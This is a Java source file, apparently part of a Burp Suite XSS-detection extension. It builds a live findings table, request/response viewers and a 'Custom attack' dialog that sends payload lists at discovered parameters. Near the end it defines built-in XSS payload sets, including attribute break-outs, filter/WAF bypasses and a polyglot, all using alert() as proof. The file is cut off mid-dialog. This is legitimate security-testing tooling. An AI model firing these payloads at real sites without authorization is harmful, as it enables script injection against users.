package burp;

import javax.swing.*;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.FileWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;

/**
 * Live Results view: a real-time table of findings with a raw request/response
 * viewer below and smart filter controls on the right. Observes
 * {@link FindingStore} and refreshes on the Swing thread as findings arrive
 * from the scanner and from proxied browsing traffic.
 */
public class LiveResultsPanel extends JPanel implements FindingStore.Listener {

    private final FindingStore store;
    private final IBurpExtenderCallbacks callbacks;
    private final ContextualReflectionEngine engine; // null-safe: Custom Attack disables itself without it
    private final ResultsTableModel model = new ResultsTableModel();
    private final JTable table = new JTable(model);

    private final JLabel pocBar = new JLabel(" ");
    // Burp-style per-pane header dropdowns: "Original request / Edited request 1,2,3..."
    // on the left and the matching "Original response / Edited response N" on the right.
    private final JComboBox<String> reqHeader = new JComboBox<>();
    private final JComboBox<String> respHeader = new JComboBox<>();
    private final MessageEditor reqEditor = new MessageEditor(reqHeader);
    private final MessageEditor respEditor = new MessageEditor(respHeader);
    private java.util.List<XssFinding.Msg> currentMsgs = new ArrayList<>();
    private boolean syncing = false;

    private final JTextField search = new JTextField(14);
    private final JCheckBox fHigh = new JCheckBox("High", true);
    private final JCheckBox fMedium = new JCheckBox("Medium", true);
    private final JCheckBox fLow = new JCheckBox("Low / Info", true);
    private final JCheckBox fConfirmed = new JCheckBox("Confirmed", true);
    private final JCheckBox fReflected = new JCheckBox("Reflected", true);
    private final JComboBox<String> fContext =
            new JComboBox<>(new String[]{"All contexts", "HTML", "Attribute", "JavaScript", "JSON / JSONP", "CSS", "Other"});
    private final JLabel summary = new JLabel("0 shown / 0 total");

    private final SimpleDateFormat timeFmt = new SimpleDateFormat("HH:mm:ss");

    public LiveResultsPanel(FindingStore store, IBurpExtenderCallbacks callbacks, ContextualReflectionEngine engine) {
        super(new BorderLayout(8, 8));
        this.store = store;
        this.callbacks = callbacks;
        this.engine = engine;
        setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        add(buildCenter(), BorderLayout.CENTER);
        add(buildFilters(), BorderLayout.EAST);

        store.addListener(this);
        refilter();
    }

    // ---- center: table + viewer ----

    private JComponent buildCenter() {
        // Stretch columns to fill the full width (the URL column absorbs slack)
        // so the table never leaves empty space on the right.
        table.setAutoResizeMode(JTable.AUTO_RESIZE_SUBSEQUENT_COLUMNS);
        table.setRowHeight(22);
        table.setFillsViewportHeight(true);
        // Multi-select (ctrl/shift-click, or drag) so Custom Attack can target
        // several reflected findings at once with the same payload list -- the
        // single-row actions (Copy URL/PoC, Send to Repeater) still just act on
        // whichever row is the anchor of the selection.
        table.getSelectionModel().setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
        setColWidths();

        table.setDefaultRenderer(Object.class, new SeverityRowRenderer());

        table.getSelectionModel().addListSelectionListener(e -> {
            if (!e.getValueIsAdjusting()) {
                showSelected();
            }
        });
        installContextMenu();

        JScrollPane tableScroll = new JScrollPane(table);
        tableScroll.setBorder(BorderFactory.createTitledBorder("Findings (live)"));

        // PoC / location bar: the exploit payload and where it landed.
        pocBar.setBorder(BorderFactory.createEmptyBorder(2, 4, 4, 4));
        pocBar.setFont(pocBar.getFont().deriveFont(Font.PLAIN));

        // Burp-style layout: Request on the left, Response on the right. Each pane
        // carries its own dropdown header (Original / Edited 1,2,3 ...); the two
        // headers stay synchronized so request and response always match.
        reqHeader.setPrototypeDisplayValue("Edited request 2 - PoC (confirmed)");
        respHeader.setPrototypeDisplayValue("Edited response 2 - PoC (confirmed)");
        reqHeader.addActionListener(e -> selectVariant(reqHeader.getSelectedIndex()));
        respHeader.addActionListener(e -> selectVariant(respHeader.getSelectedIndex()));

        JSplitPane lr = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, reqEditor, respEditor);
        lr.setResizeWeight(0.5);
        lr.setBorder(null);

        // Top bar: the PoC / confirmation line for the selected finding.
        pocBar.setBorder(BorderFactory.createEmptyBorder(2, 6, 4, 6));

        JPanel viewerPanel = new JPanel(new BorderLayout());
        viewerPanel.setBorder(BorderFactory.createTitledBorder(
                "Selected finding - Original + Edited request/response; injected payload highlighted; search each pane"));
        viewerPanel.add(pocBar, BorderLayout.NORTH);
        viewerPanel.add(lr, BorderLayout.CENTER);

        JSplitPane split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, viewerPanel);
        split.setResizeWeight(0.5);
        split.setDividerLocation(280);
        split.setBorder(null);
        return split;
    }

    private void installContextMenu() {
        JPopupMenu menu = new JPopupMenu();
        JMenuItem toRepeater = new JMenuItem("Send request to Repeater");
        toRepeater.addActionListener(e -> {
            XssFinding f = model.getRow(table.getSelectedRow());
            if (f != null && f.request != null && callbacks != null && !f.host.isEmpty()) {
                try {
                    callbacks.sendToRepeater(f.host, f.port > 0 ? f.port : (f.https ? 443 : 80),
                            f.https, f.request, "XSS: " + f.parameter);
                } catch (Exception ex) {
                    JOptionPane.showMessageDialog(this, "Send to Repeater failed: " + ex.getMessage());
                }
            }
        });
        JMenuItem copyUrl = new JMenuItem("Copy URL");
        copyUrl.addActionListener(e -> copyToClipboard(get(model.getRow(table.getSelectedRow()), true)));
        JMenuItem copyPoc = new JMenuItem("Copy PoC payload");
        copyPoc.addActionListener(e -> copyToClipboard(get(model.getRow(table.getSelectedRow()), false)));
        JMenuItem customAttack = new JMenuItem("Custom attack (payload list)...");
        customAttack.addActionListener(e -> openCustomAttack(getSelectedFindings()));
        menu.add(toRepeater);
        menu.add(copyUrl);
        menu.add(copyPoc);
        menu.addSeparator();
        menu.add(customAttack);

        table.addMouseListener(new java.awt.event.MouseAdapter() {
            @Override public void mousePressed(java.awt.event.MouseEvent e) { maybeShow(e); }
            @Override public void mouseReleased(java.awt.event.MouseEvent e) { maybeShow(e); }
            private void maybeShow(java.awt.event.MouseEvent e) {
                if (e.isPopupTrigger()) {
                    int row = table.rowAtPoint(e.getPoint());
                    // Right-clicking a row that is already part of a multi-row
                    // selection keeps the whole selection (so Custom Attack can
                    // target all of them); right-clicking an unselected row
                    // replaces the selection with just that one, as usual.
                    if (row >= 0 && !table.isRowSelected(row)) {
                        table.setRowSelectionInterval(row, row);
                    }
                    if (row >= 0) {
                        menu.show(table, e.getX(), e.getY());
                    }
                }
            }
        });
    }

    private String get(XssFinding f, boolean url) {
        if (f == null) return "";
        return url ? f.url : f.poc;
    }

    /** Every selected row's finding, in table order, deduplicated. Multi-select
     *  (ctrl/shift-click or drag) feeds this -- that's how several reflected
     *  findings can be attacked with the same payload list in one run. */
    private List<XssFinding> getSelectedFindings() {
        List<XssFinding> out = new ArrayList<>();
        for (int row : table.getSelectedRows()) {
            XssFinding f = model.getRow(row);
            if (f != null && !out.contains(f)) {
                out.add(f);
            }
        }
        return out;
    }

    /**
     * Resolve EVERY selected row's injection point and open one Custom Attack
     * dialog covering all of them -- the same pasted/loaded/built-in payload
     * list is then fired at each selected finding's parameter in turn. Rows
     * that can't be resolved (no stored request, parameter no longer present,
     * no host) are skipped with a reason, rather than aborting the whole run.
     */
    private void openCustomAttack(List<XssFinding> findings) {
        if (findings == null || findings.isEmpty()) {
            JOptionPane.showMessageDialog(this,
                    "Select one or more finding rows first (ctrl/shift-click or drag to select several).",
                    "Custom attack", JOptionPane.INFORMATION_MESSAGE);
            return;
        }
        if (engine == null || callbacks == null) {
            JOptionPane.showMessageDialog(this, "Detection engine unavailable.", "Custom attack",
                    JOptionPane.WARNING_MESSAGE);
            return;
        }
        List<CustomAttackDialog.Target> targets = new ArrayList<>();
        List<String> skipped = new ArrayList<>();
        for (XssFinding f : findings) {
            String why = resolveTarget(f, targets);
            if (why != null) {
                skipped.add((f.parameter == null || f.parameter.isEmpty() ? "(no parameter)" : f.parameter) + ": " + why);
            }
        }
        if (targets.isEmpty()) {
            JOptionPane.showMessageDialog(this,
                    "None of the selected rows could be resolved to an injectable parameter:\n"
                    + String.join("\n", skipped),
                    "Custom attack", JOptionPane.WARNING_MESSAGE);
            return;
        }
        if (!skipped.isEmpty()) {
            JOptionPane.showMessageDialog(this,
                    "Skipping " + skipped.size() + " of " + findings.size() + " selected row(s):\n"
                    + String.join("\n", skipped) + "\n\nContinuing with the other " + targets.size() + ".",
                    "Custom attack", JOptionPane.WARNING_MESSAGE);
        }
        new CustomAttackDialog(SwingUtilities.getWindowAncestor(this), callbacks, engine, targets).setVisible(true);
    }

    /** Try to resolve one finding to an attackable target; appends to {@code out}
     *  on success and returns null, or returns the reason it could not. */
    private String resolveTarget(XssFinding f, List<CustomAttackDialog.Target> out) {
        if (f.request == null || f.parameter == null || f.parameter.isEmpty()) {
            return "no injectable parameter recorded";
        }
        if (f.host == null || f.host.isEmpty()) {
            return "no host recorded";
        }
        ContextualReflectionEngine.Injector injector = engine.injectorForFinding(f.request, f.parameter, f.paramSource);
        if (injector == null) {
            return "could not locate it in the stored request";
        }
        int port = f.port > 0 ? f.port : (f.https ? 443 : 80);
        IHttpService service;
        try {
            service = callbacks.buildHttpService(f.host, port, f.https);
        } catch (Exception ex) {
            return "could not build target service (" + ex.getMessage() + ")";
        }
        out.add(new CustomAttackDialog.Target(injector, service, f));
        return null;
    }

    private void copyToClipboard(String s) {
        if (s == null || s.isEmpty()) return;
        try {
            Toolkit.getDefaultToolkit().getSystemClipboard()
                    .setContents(new java.awt.datatransfer.StringSelection(s), null);
        } catch (Exception ignored) {
            // clipboard may be unavailable
        }
    }

    private void setColWidths() {
        // Time, Severity, Status, Tested, Context, Parameter, Param Source, URL, Source
        int[] w = {70, 70, 80, 70, 180, 120, 110, 320, 80};
        for (int i = 0; i < w.length && i < table.getColumnCount(); i++) {
            table.getColumnModel().getColumn(i).setPreferredWidth(w[i]);
        }
    }

    // ---- east: smart filters ----

    private JComponent buildFilters() {
        JPanel p = new JPanel();
        p.setLayout(new BoxLayout(p, BoxLayout.Y_AXIS));
        p.setBorder(BorderFactory.createTitledBorder("Smart filters"));
        p.setPreferredSize(new Dimension(210, 10));

        p.add(leftLabel("Search (URL / parameter / PoC)"));
        search.setMaximumSize(new Dimension(Integer.MAX_VALUE, search.getPreferredSize().height));
        search.setAlignmentX(LEFT_ALIGNMENT);
        search.getDocument().addDocumentListener(new DocumentListener() {
            public void insertUpdate(DocumentEvent e) { refilter(); }
            public void removeUpdate(DocumentEvent e) { refilter(); }
            public void changedUpdate(DocumentEvent e) { refilter(); }
        });
        p.add(search);
        p.add(Box.createVerticalStrut(10));

        p.add(leftLabel("Severity"));
        for (JCheckBox cb : new JCheckBox[]{fHigh, fMedium, fLow}) {
            cb.setAlignmentX(LEFT_ALIGNMENT);
            cb.addActionListener(e -> refilter());
            p.add(cb);
        }
        p.add(Box.createVerticalStrut(10));

        p.add(leftLabel("Status"));
        for (JCheckBox cb : new JCheckBox[]{fConfirmed, fReflected}) {
            cb.setAlignmentX(LEFT_ALIGNMENT);
            cb.addActionListener(e -> refilter());
            p.add(cb);
        }
        p.add(Box.createVerticalStrut(10));

        p.add(leftLabel("Context"));
        fContext.setMaximumSize(new Dimension(Integer.MAX_VALUE, fContext.getPreferredSize().height));
        fContext.setAlignmentX(LEFT_ALIGNMENT);
        fContext.addActionListener(e -> refilter());
        p.add(fContext);
        p.add(Box.createVerticalStrut(14));

        summary.setAlignmentX(LEFT_ALIGNMENT);
        summary.setFont(summary.getFont().deriveFont(Font.BOLD));
        p.add(summary);
        p.add(Box.createVerticalStrut(10));

        JButton clear = new JButton("Clear results");
        clear.setAlignmentX(LEFT_ALIGNMENT);
        clear.setMaximumSize(new Dimension(Integer.MAX_VALUE, clear.getPreferredSize().height));
        clear.addActionListener(e -> store.clear());
        p.add(clear);
        p.add(Box.createVerticalStrut(6));

        JButton export = new JButton("Export CSV");
        export.setAlignmentX(LEFT_ALIGNMENT);
        export.setMaximumSize(new Dimension(Integer.MAX_VALUE, export.getPreferredSize().height));
        export.addActionListener(e -> exportCsv());
        p.add(export);
        p.add(Box.createVerticalStrut(6));

        JButton customAttackBtn = new JButton("Custom attack (payload list)...");
        customAttackBtn.setAlignmentX(LEFT_ALIGNMENT);
        customAttackBtn.setMaximumSize(new Dimension(Integer.MAX_VALUE, customAttackBtn.getPreferredSize().height));
        customAttackBtn.setToolTipText("Pick the selected row's parameter and fire your own payload list at it "
                + "(paste, load a .txt file, or start from a built-in set)");
        customAttackBtn.addActionListener(e -> openCustomAttack(getSelectedFindings()));
        p.add(customAttackBtn);

        p.add(Box.createVerticalGlue());
        return p;
    }

    private JComponent leftLabel(String text) {
        JLabel l = new JLabel(text);
        l.setAlignmentX(LEFT_ALIGNMENT);
        l.setBorder(BorderFactory.createEmptyBorder(0, 0, 3, 0));
        return l;
    }

    // ---- store callback ----

    @Override
    public void onFindingsChanged() {
        SwingUtilities.invokeLater(this::refilter);
    }

    private void refilter() {
        String q = search.getText() == null ? "" : search.getText().trim().toLowerCase();
        Set<String> sev = new LinkedHashSet<>();
        if (fHigh.isSelected()) sev.add("High");
        if (fMedium.isSelected()) sev.add("Medium");
        if (fLow.isSelected()) { sev.add("Low"); sev.add("Info"); }
        boolean confirmed = fConfirmed.isSelected();
        boolean reflected = fReflected.isSelected();
        String ctxGroup = (String) fContext.getSelectedItem();

        List<XssFinding> all = store.snapshot();
        List<XssFinding> shown = new ArrayList<>();
        for (XssFinding f : all) {
            if (!sev.contains(f.severity)) continue;
            if (XssFinding.STATUS_CONFIRMED.equals(f.status) && !confirmed) continue;
            if (XssFinding.STATUS_REFLECTED.equals(f.status) && !reflected) continue;
            if (!matchesContext(f.context, ctxGroup)) continue;
            if (!q.isEmpty()) {
                String hay = (f.url + " " + f.parameter + " " + f.poc + " " + f.context + " " + f.paramSource)
                        .toLowerCase();
                if (!hay.contains(q)) continue;
            }
            shown.add(f);
        }
        // newest first
        shown.sort((a, b) -> Long.compare(b.time, a.time));
        model.setRows(shown);
        summary.setText(shown.size() + " shown / " + all.size() + " total");
    }

    private boolean matchesContext(String context, String group) {
        if (group == null || group.startsWith("All")) {
            return true;
        }
        String c = context.toLowerCase();
        switch (group) {
            case "JSON / JSONP": return c.contains("json");
            case "JavaScript": return c.contains("script") || c.contains("javascript")
                    || c.contains("template") || c.contains("event handler");
            case "Attribute": return c.contains("attribute");
            case "HTML": return c.contains("html") || c.contains("tag") || c.contains("comment")
                    || c.contains("rawtext");
            case "CSS": return c.contains("style") || c.contains("css");
            case "Other":
            default:
                boolean known = c.contains("json") || c.contains("script") || c.contains("attribute")
                        || c.contains("html") || c.contains("tag") || c.contains("comment")
                        || c.contains("template") || c.contains("event handler")
                        || c.contains("style") || c.contains("css") || c.contains("rawtext");
                return !known;
        }
    }

    private void showSelected() {
        int row = table.getSelectedRow();
        XssFinding f = model.getRow(row);
        if (f == null) {
            currentMsgs = new ArrayList<>();
            syncing = true;
            reqHeader.removeAllItems();
            respHeader.removeAllItems();
            syncing = false;
            reqEditor.setMessage(null, null);
            respEditor.setMessage(null, null);
            pocBar.setText(" ");
            return;
        }

        // Build the message list (Original + Edited N); fall back to the single pair.
        currentMsgs = new ArrayList<>();
        if (f.messages != null && !f.messages.isEmpty()) {
            currentMsgs.addAll(f.messages);
        } else {
            currentMsgs.add(new XssFinding.Msg("Original", f.request, f.response,
                    f.reqHighlight, f.respHighlight));
        }
        // Populate both pane dropdowns with Burp-style labels, without firing listeners.
        syncing = true;
        reqHeader.removeAllItems();
        respHeader.removeAllItems();
        int edited = 0;
        for (int i = 0; i < currentMsgs.size(); i++) {
            XssFinding.Msg m = currentMsgs.get(i);
            if (i == 0 && isOriginal(m.label)) {
                reqHeader.addItem("Original request");
                respHeader.addItem("Original response");
            } else {
                edited++;
                String d = variantDesc(m.label);
                reqHeader.addItem("Edited request " + edited + d);
                respHeader.addItem("Edited response " + edited + d);
            }
        }
        syncing = false;
        // Default to the PoC (last message) so the proof is shown first.
        int def = currentMsgs.size() - 1;
        selectVariant(def);

        boolean confirmed = XssFinding.STATUS_CONFIRMED.equals(f.status);
        String label = confirmed
                ? "<b>CONFIRMED</b> " + esc(f.severity) + " XSS"
                : f.testedContextually
                    ? "<b>Reflected</b> (actively tested - no break-out confirmed)"
                    : "<b>Reflected</b> (passive sighting - not yet actively tested)";
        String poc = confirmed ? "&nbsp; Payload: <code>" + esc(f.poc) + "</code>" : "";
        String via = (confirmed && f.technique != null && !f.technique.isEmpty() && !"direct".equals(f.technique))
                ? " &nbsp;|&nbsp; via: <b>" + esc(f.technique) + "</b>" : "";
        String src = (f.paramSource != null && !f.paramSource.isEmpty())
                ? " &nbsp;|&nbsp; Source: <b>" + esc(f.paramSource) + "</b>" : "";
        pocBar.setText("<html>" + label + " &nbsp;|&nbsp; Parameter: <b>" + esc(f.parameter)
                + "</b>" + src + " &nbsp;|&nbsp; Context: " + esc(f.context) + via + poc + "</html>");
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    /** Select the same variant in both pane dropdowns and load it into the editors. */
    private void selectVariant(int i) {
        if (syncing) {
            return;
        }
        if (i < 0 || i >= currentMsgs.size()) {
            return;
        }
        syncing = true;
        if (reqHeader.getItemCount() > i) reqHeader.setSelectedIndex(i);
        if (respHeader.getItemCount() > i) respHeader.setSelectedIndex(i);
        syncing = false;
        loadMessage(currentMsgs.get(i));
    }

    private static boolean isOriginal(String label) {
        return label != null && label.toLowerCase().startsWith("original");
    }

    /** Short descriptor appended to an Edited label (" - break-out test", " - PoC"). */
    private static String variantDesc(String label) {
        if (label == null) {
            return "";
        }
        if (label.toLowerCase().startsWith("probe")) {
            return " - break-out test";
        }
        int dash = label.indexOf(" - ");
        if (dash >= 0) {
            return " - " + label.substring(dash + 3);
        }
        return "";
    }

    /** Load one request/response pair into the side-by-side editors with markers. */
    private void loadMessage(XssFinding.Msg m) {
        if (m == null) {
            reqEditor.setMessage(null, null);
            respEditor.setMessage(null, null);
            return;
        }
        reqEditor.setMessage(m.request, m.reqHighlight);
        respEditor.setMessage(m.response, m.respHighlight);
    }

    private void exportCsv() {
        try {
            JFileChooser fc = new JFileChooser();
            fc.setSelectedFile(new java.io.File("xssdetector-findings.csv"));
            if (fc.showSaveDialog(this) != JFileChooser.APPROVE_OPTION) {
                return;
            }
            try (FileWriter w = new FileWriter(fc.getSelectedFile())) {
                w.write("Time,Severity,Status,Tested,Context,Parameter,Param Source,Method,Host,URL,Source,PoC\n");
                for (XssFinding f : model.rows) {
                    w.write(csv(timeFmt.format(new Date(f.time))) + "," + csv(f.severity) + "," + csv(f.status)
                            + "," + (f.testedContextually ? "Yes" : "No")
                            + "," + csv(f.context) + "," + csv(f.parameter) + "," + csv(f.paramSource)
                            + "," + csv(f.method) + "," + csv(f.host) + "," + csv(f.url) + "," + csv(f.source)
                            + "," + csv(f.poc) + "\n");
                }
            }
            JOptionPane.showMessageDialog(this, "Exported " + model.rows.size() + " finding(s).");
        } catch (Exception ex) {
            JOptionPane.showMessageDialog(this, "Export failed: " + ex.getMessage(),
                    "Export", JOptionPane.ERROR_MESSAGE);
        }
    }

    private static String csv(String s) {
        if (s == null) return "";
        if (s.contains(",") || s.contains("\"") || s.contains("\n")) {
            return "\"" + s.replace("\"", "\"\"") + "\"";
        }
        return s;
    }

    // ---- Burp-style HTTP message editor (read-only) with find + jump-to ----

    private static final class MessageEditor extends JPanel {
        private final JTextArea area = new JTextArea();
        private final JTextField find = new JTextField(10);
        private final JLabel count = new JLabel("");
        private final List<int[]> matches = new ArrayList<>();
        private int current = -1;

        private static final javax.swing.text.Highlighter.HighlightPainter PAYLOAD =
                new javax.swing.text.DefaultHighlighter.DefaultHighlightPainter(new Color(0xFF, 0xE0, 0x66));
        private static final javax.swing.text.Highlighter.HighlightPainter MATCH =
                new javax.swing.text.DefaultHighlighter.DefaultHighlightPainter(new Color(0xBF, 0xE3, 0xFF));
        private static final javax.swing.text.Highlighter.HighlightPainter CURRENT =
                new javax.swing.text.DefaultHighlighter.DefaultHighlightPainter(new Color(0x7F, 0xC8, 0xFF));

        MessageEditor(JComboBox<String> header) {
            super(new BorderLayout());
            setBorder(BorderFactory.createLineBorder(new Color(0xBD, 0xC3, 0xC7)));

            // Burp-style pane header: the Original/Edited dropdown sits at the top.
            JPanel head = new JPanel(new BorderLayout());
            head.setBorder(BorderFactory.createEmptyBorder(2, 4, 2, 4));
            head.add(header, BorderLayout.WEST);
            add(head, BorderLayout.NORTH);

            area.setEditable(false);
            area.setLineWrap(true);
            area.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
            add(new JScrollPane(area), BorderLayout.CENTER);

            JPanel bar = new JPanel(new BorderLayout(4, 0));
            bar.add(new JLabel(" Search "), BorderLayout.WEST);
            bar.add(find, BorderLayout.CENTER);
            JButton prev = new JButton("▲");
            JButton next = new JButton("▼");
            prev.setMargin(new Insets(0, 6, 0, 6));
            next.setMargin(new Insets(0, 6, 0, 6));
            JPanel right = new JPanel(new FlowLayout(FlowLayout.LEFT, 3, 1));
            right.add(prev);
            right.add(next);
            right.add(count);
            bar.add(right, BorderLayout.EAST);
            add(bar, BorderLayout.SOUTH);

            find.addActionListener(e -> step(1));
            prev.addActionListener(e -> step(-1));
            next.addActionListener(e -> step(1));
            find.getDocument().addDocumentListener(new DocumentListener() {
                public void insertUpdate(DocumentEvent e) { runSearch(); }
                public void removeUpdate(DocumentEvent e) { runSearch(); }
                public void changedUpdate(DocumentEvent e) { runSearch(); }
            });
        }

        void setMessage(byte[] data, String payload) {
            area.setText(data != null ? new String(data, StandardCharsets.ISO_8859_1) : "");
            area.getHighlighter().removeAllHighlights();
            matches.clear();
            current = -1;
            count.setText("");
            // Highlight the payload / reflected value and scroll to it.
            String term = payload;
            if (term != null && !term.isEmpty()) {
                String text = area.getText();
                int idx = text.indexOf(term);
                if (idx < 0 && term.length() > 12) {
                    term = term.substring(0, 12);
                    idx = text.indexOf(term);
                }
                if (idx >= 0) {
                    try {
                        area.getHighlighter().addHighlight(idx, idx + term.length(), PAYLOAD);
                        scrollTo(idx, idx + term.length());
                    } catch (Exception ignored) {
                        area.setCaretPosition(0);
                    }
                } else {
                    area.setCaretPosition(0);
                }
            } else {
                area.setCaretPosition(0);
            }
            if (find.getText() != null && !find.getText().isEmpty()) {
                runSearch();
            }
        }

        private void runSearch() {
            area.getHighlighter().removeAllHighlights();
            matches.clear();
            current = -1;
            // Re-add payload highlight if still present.
            // (Recompute from scratch is simplest and cheap for these sizes.)
            String q = find.getText();
            String text = area.getText();
            if (q != null && !q.isEmpty()) {
                String hay = text.toLowerCase();
                String needle = q.toLowerCase();
                int from = 0;
                while (true) {
                    int idx = hay.indexOf(needle, from);
                    if (idx < 0) {
                        break;
                    }
                    matches.add(new int[]{idx, idx + q.length()});
                    from = idx + Math.max(1, q.length());
                    if (matches.size() > 5000) {
                        break;
                    }
                }
            }
            try {
                for (int[] m : matches) {
                    area.getHighlighter().addHighlight(m[0], m[1], MATCH);
                }
            } catch (Exception ignored) {
                // ignore highlight failures
            }
            count.setText(matches.isEmpty() ? (q == null || q.isEmpty() ? "" : "0") : ("1/" + matches.size()));
            if (!matches.isEmpty()) {
                current = 0;
                markCurrent();
            }
        }

        private void step(int dir) {
            if (matches.isEmpty()) {
                return;
            }
            current = (current + dir + matches.size()) % matches.size();
            markCurrent();
            count.setText((current + 1) + "/" + matches.size());
        }

        private void markCurrent() {
            // Re-draw: all matches blue, current darker.
            area.getHighlighter().removeAllHighlights();
            try {
                for (int i = 0; i < matches.size(); i++) {
                    int[] m = matches.get(i);
                    area.getHighlighter().addHighlight(m[0], m[1], i == current ? CURRENT : MATCH);
                }
            } catch (Exception ignored) {
                // ignore
            }
            if (current >= 0 && current < matches.size()) {
                int[] m = matches.get(current);
                scrollTo(m[0], m[1]);
            }
        }

        private void scrollTo(int start, int end) {
            try {
                area.setCaretPosition(Math.min(area.getText().length(), end));
                area.moveCaretPosition(start);
                java.awt.Rectangle r = area.modelToView(start);
                if (r != null) {
                    area.scrollRectToVisible(r);
                }
            } catch (Exception ignored) {
                // best-effort scroll
            }
        }
    }

    // ---- Custom Attack: fire a user-supplied payload list at one stored finding ----

    /**
     * A handful of small, well-known starter payloads per bypass style, offered
     * as a quick-fill so the user isn't starting from a blank text area. These
     * are NOT the engine's own context-derived PoC (that stays automatic and
     * confirmed-only) -- this is the user's own list, tried verbatim, exactly
     * as typed/pasted/loaded.
     */
    private static final java.util.Map<String, String> BUILTIN_PAYLOAD_SETS = new java.util.LinkedHashMap<>();
    static {
        BUILTIN_PAYLOAD_SETS.put("Basic tags", String.join("\n",
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>"));
        BUILTIN_PAYLOAD_SETS.put("Attribute break-out", String.join("\n",
                "\"><img src=x onerror=alert(1)>",
                "'><img src=x onerror=alert(1)>",
                "\" autofocus onfocus=alert(1) x=\"",
                "' autofocus onfocus=alert(1) x='",
                "\"><svg onload=alert(1)>"));
        BUILTIN_PAYLOAD_SETS.put("JavaScript context", String.join("\n",
                "';alert(1);//",
                "\";alert(1);//",
                "</script><img src=x onerror=alert(1)>",
                "${alert(1)}",
                "`;alert(1);//"));
        BUILTIN_PAYLOAD_SETS.put("Filter / WAF bypass", String.join("\n",
                "<svg/onload=alert(1)>",
                "<img src=x OnErRoR=alert(1)>",
                "<img src=x onerror=prompt(1)>",
                "<IMG SRC=x onerror=\"&#97;lert(1)\">",
                "javascript:alert(1)",
                "<img src=x onerror=alert`1`>"));
        BUILTIN_PAYLOAD_SETS.put("Polyglot", String.join("\n",
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>"));
    }

    /**
     * Fire a user-chosen payload list (pasted, loaded from a file, or started
     * from a built-in set) at ONE already-located parameter, one payload per
     * live request, in a background thread. Any payload that comes back
     * verbatim and unescaped is both shown in the results table here AND added
     * to the main Live Results view as a Confirmed finding (source "Custom
     * Attack"), so it is visible, filterable and exportable like any other row.
     */
    private static final class CustomAttackDialog extends JDialog {

        /** One resolved, attackable spot: an injector for a specific finding's
         *  exact parameter plus the service to send it to. */
        static final class Target {
            final ContextualReflectionEngine.Injector injector;
            final IHttpService service;
            final XssFinding finding;
            final java.util.concurrent.atomic.AtomicInteger confirmedCount = new java.util.concurrent.atomic.AtomicInteger();
            Target(ContextualReflectionEngine.Injector injector, IHttpService service, XssFinding finding) {
                this.injector = injector;
                this.service = service;
                this.finding = finding;
            }
        }

        /** One attempt plus which target it was fired at -- needed once there can
         *  be more than one target in a single run. */
        private static final class Row {
            final Target target;
            final ContextualReflectionEngine.AttackAttempt attempt;
            Row(Target target, ContextualReflectionEngine.AttackAttempt attempt) {
                this.target = target;
                this.attempt = attempt;
            }
        }

        private final IBurpExtenderCallbacks callbacks;
        private final ContextualReflectionEngine engine;
        private final List<Target> targets;

        private final JTextArea payloadArea = new JTextArea(10, 60);
        private final JComboBox<String> builtin = new JComboBox<>(BUILTIN_PAYLOAD_SETS.keySet().toArray(new String[0]));
        private final JLabel progress = new JLabel("0 / 0 tested, 0 reflected");
        private final JButton startBtn = new JButton("Start attack");
        private final JButton stopBtn = new JButton("Stop");
        private final DefaultTableModel resultModel =
                new DefaultTableModel(new Object[]{"Target (host + parameter)", "Payload", "Reflected", "Status"}, 0) {
                    @Override public boolean isCellEditable(int r, int c) { return false; }
                };
        private final JTable resultTable = new JTable(resultModel);
        private final java.util.List<Row> rows = new ArrayList<>();
        private final java.util.concurrent.atomic.AtomicBoolean cancelled = new java.util.concurrent.atomic.AtomicBoolean(false);
        private volatile boolean running = false;

        CustomAttackDialog(Window owner, IBurpExtenderCallbacks callbacks, ContextualReflectionEngine engine,
                          List<Target> targets) {
            super(owner, "Custom attack - " + targets.size() + " target(s)", ModalityType.MODELESS);
            this.callbacks = callbacks;
            this.engine = engine;
            this.targets = targets;
            setLayout(new BorderLayout(8, 8));
            ((JComponent) getContentPane()).setBorder(BorderFactory.createEmptyBorder(8, 8, 8, 8));

            StringBuilder tb = new StringBuilder("<html>Targets (" + targets.size() + "):<ul style='margin:2px 0 0 14px'>");
            int shown = 0;
            for (Target t : targets) {
                if (shown >= 8) {
                    tb.append("<li>... and ").append(targets.size() - shown).append(" more</li>");
                    break;
                }
                XssFinding f = t.finding;
                tb.append("<li><b>").append(esc(f.parameter)).append("</b> (")
                  .append(esc(f.paramSource == null || f.paramSource.isEmpty() ? "?" : f.paramSource))
                  .append(") on ").append(esc(f.host)).append(" &mdash; ").append(esc(f.context)).append("</li>");
                shown++;
            }
            tb.append("</ul></html>");
            JLabel header = new JLabel(tb.toString());
            header.setBorder(BorderFactory.createEmptyBorder(0, 0, 8, 0));
            add(header, BorderLayout.NORTH);

            JPanel top = new JPanel(new BorderLayout(4, 4));
            payloadArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
            payloadArea.setToolTipText("One payload per line. Blank lines and lines starting with # are ignored.");
            top.add(new JScrollPane(payloadArea), BorderLayout.CENTER);

            JPanel srcRow = new JPanel(new FlowLayout(FlowLayout.LEFT, 4, 2));
            srcRow.add(new JLabel("Built-in set:"));
            srcRow.add(builtin);
            JButton insertBuiltin = new JButton("Insert");
            insertBuiltin.addActionListener(e -> {
                String set = BUILTIN_PAYLOAD_SETS.get(builtin.getSelectedItem());
                if (set != null) {
